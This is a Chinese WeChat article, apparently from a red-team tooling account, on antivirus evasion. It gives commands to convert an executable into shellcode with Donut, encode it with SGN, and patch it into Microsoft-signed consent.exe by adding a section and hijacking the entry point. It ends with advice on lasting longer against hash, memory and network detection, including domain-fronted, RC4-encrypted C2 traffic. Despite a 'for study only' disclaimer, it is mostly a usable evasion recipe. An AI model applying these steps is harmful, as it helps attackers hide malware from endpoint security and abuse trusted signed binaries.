---
title: Donut+SGN 利用微软签名进行静态特征混淆与终端检测规避
url: https://mp.weixin.qq.com/s/USOPuYUUAGCUIwEy3K2HZA
source: Doonsec's feed
date: 2026-02-22
fetch_date: 2026-02-23T04:18:35.131955
---

# Donut+SGN 利用微软签名进行静态特征混淆与终端检测规避

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/x2ibBTFXYHicIRqhF3pXIewAEdmmXtqktGZaTO3LfKXqCq12ZyJlv4nLxwYlyJlu7yo2z9unVlJNWYSV9XYLhkweX5cbYRzGjhuWnf2Vw6icZQ/0?wx_fmt=jpeg)

# Donut+SGN 利用微软签名进行静态特征混淆与终端检测规避

原创

网安武器库
网安武器库

网安武器库

![]()

在小说阅读器中沉浸阅读

**更多干货  点击蓝字 关注我们**

**注：本文仅供学习，坚决反对一切危害网络安全的行为。造成法律后果自行负责！**

**往期回顾**

·[FnOS GUI Exploit Tool:针对 FnOS 系统的综合漏洞利用工具](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486470&idx=1&sn=be6ac8da8d54423b050f7ab7e596659b&scene=21#wechat_redirect)

·[ManSpider：一款黑客内网快速敏感信息搜集工具](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486462&idx=1&sn=13d367de0d7867608564ca9827a012b9&scene=21#wechat_redirect)

·[Web-Check：一款全面的web网站信息和漏洞扫描工具](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486451&idx=1&sn=1e91aeea9f174b4331a580e28e5c273f&scene=21#wechat_redirect)

·[Super Xray：一款基于 Xray 的漏洞扫描工具](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486414&idx=1&sn=e344d3236ff2d3e83bffef09c1f7e1f7&scene=21#wechat_redirect)

·[upload\_forge：CTF利器-文件上传漏洞扫描工具](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486388&idx=1&sn=f7c43e484275521abb27f417a26ddb60&scene=21#wechat_redirect)

·[Havoc：现代化后渗透命令与控制(C2)工具](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486375&idx=1&sn=98207489b2de236c7eb471e09875c659&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eFcsfYatVNptgRDr3kqeFwpGYKFziaX9s7BBcG8prEJFW1g1EickibFyug/640?wx_fmt=png&from=appmsg)

**背景分析**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/x2ibBTFXYHicKXT3uup6OZ4DABzSGW4rUHFQYr2F7HiaWjwtBvHLemBicSzWTh1xvHqohRwQSZsus7StZjKwBgW9EVqR1SJPlYZvTecLLk5L8PQ/640?wx_fmt=png&from=appmsg)

      该免杀机制通过依托微软签名的高信誉白文件作为合法载体，仅对文件代码段或新增节区进行局部修改，在不破坏数字签名与系统信任判定的前提下完成代码植入；利用Donut将可执行文件转换为位置无关的 ShellCode，实现代码仅在内存中解密执行而不落地生成完整 PE 文件，规避静态文件检测；结合SGN 编码对 ShellCode 进行单字节异或加密并采用随机密钥，破坏静态特征并提升样本随机性，降低特征码匹配概率；为保证 Donut 正常解析 PE 结构，原始文件需保持无壳、无加密状态，从而在信任机制、内存执行与特征混淆的协同作用下实现对抗终端检测的目标。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eFcsfYatVNptgRDr3kqeFwpGYKFziaX9s7BBcG8prEJFW1g1EickibFyug/640?wx_fmt=png&from=appmsg)

**配置及演示**

donut 把 exe → shellcode

更新系统包

```
sudo apt update && sudo apt upgrade -y
```

安装编译依赖（gcc、make、mingw-w64、python3-pip等）

```
sudo apt install -y gcc make mingw-w64 python3 python3-pip python3-setuptools git
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/x2ibBTFXYHicKOT45q8VbBOIjnjlgPWse9obd3Q5cdqKvJ2hmZKYtPgUemuHwLWZcvpecwTbhpyQibV3UZAn96D5lBQqQqhUxYZib02yrgbPKI0/640?wx_fmt=png&from=appmsg)

克隆 Donut 仓库并编译

```
git clone https://github.com/TheWover/donut.gitcd donutmake
```

![](https://mmbiz.qpic.cn/mmbiz_png/x2ibBTFXYHicLW7KkzDlrL24mYiadfzauBQAh7ibj31aPtXu1OpUXyk70jZRYbnU6f7R9OVfKZiaXOexuwPiaQ255mn2vkAJoxWXoDnV9TXiacUicps/640?wx_fmt=png&from=appmsg)

sgn 编码

```
git clone https://github.com/EgeBalci/sgn
```

![](https://mmbiz.qpic.cn/mmbiz_png/x2ibBTFXYHicIo1WFNaBOblDGicmia7NaVTAUYbovaHRbkBE2Xo4w2UQGOTltYKZ3ktOm3pyEo2ic7Qr70tYzAz6DkuwpIGbuXn0RZeQD7JBu0h4/640?wx_fmt=png&from=appmsg)

```
sudo apt install -y cargocd sgn && cargo build --release
```

转换

```
#原始 exe → shellcodedonut -f fscan.exe -o fscan.bin -a 2 -b 1   # -a 2:x64  -b 1:exit-thread#单字节 XOR 随机编码sgn/sgn -i fscan.bin -o work.bin -a 15      # -a 15: 15 轮编码，随机 key#Patch 到白文件（示例：consent.exe）python3 patch-white.py consent.exe work.bin 0x00424000 consent_patched.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/x2ibBTFXYHicLXoNo142sm6sicQhnoaB13xIjFK7euTjDByia0DckkNicicyQOib52fTNZibGreg7jXvOWztOHtbDHI7vRaFZs5yFIVeibRpl8Siaq8t4/640?wx_fmt=png&from=appmsg)

patch-white.py 核心逻辑：

在 consent.exe 新增名为 .patch 的 Section；

将 work.bin 写进去；

修改入口点为 ShellCode，尾部 jmp 回原入口。

```
# 本地 VT 预检（不上传文件）virustotal.py consent_patched.exe --no-upload# 内存执行观察process-hacker → 属性 → .patch Section → 内存窗口可见解密过程
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/x2ibBTFXYHicLosvoanL6HVU97ibyMIGIMYDgkibGVofEdGV1ROS4st1f1bEOVDrOX6bS5icAL8OvGiaj7NPe9dic8yKRv48ddx1hFsjmjBbicaa8ow/640?wx_fmt=jpeg&from=appmsg)

该免杀样本在不同检测维度下呈现差异化的存活周期与对抗策略：

      哈希黑名单维度下样本平均存活 0 至 24 小时，触发点为样本哈希值被云查杀平台上传并纳入黑名单，红队可通过每次版本发布时更换新编译器、随机化节区名称的方式规避；

      行为特征检测维度下样本存活周期为 6 至 48 小时，触发点为终端安全工具的内存扫描行为，需通过将 SGN 编码轮次提升至 15 次及以上，并植入 Sleep 函数混淆执行时序以降低行为特征被识别的概率；

      网络特征维度下样本存活周期为 1 至 7 天，触发点为恶意流量出网连接 C2 服务器，可采用域前置技术结合 RC4 算法对流量进行二次加密以隐匿网络特征；

      而签名失效维度无固定存活周期且无明确触发条件，核心特征为白文件的数字签名仍保持有效性，但文件哈希值因局部修改发生变更，该特性可维持系统对文件的信任判定，无需额外对抗操作。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eRUtCzBCFbaMYy1c7utlweibCFXWsicmm9ebyvInBtdsD0QRlUDTdLib1g/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ujZsao69o9To7R2EPMICOxibwVeWgBhbMqg4icbbohwQibUQoRcx6ymIwZylKcXjdYCZWgQcibhibzqTyA/0?wx_fmt=png)

网安武器库

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ujZsao69o9To7R2EPMICOxibwVeWgBhbMqg4icbbohwQibUQoRcx6ymIwZylKcXjdYCZWgQcibhibzqTyA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过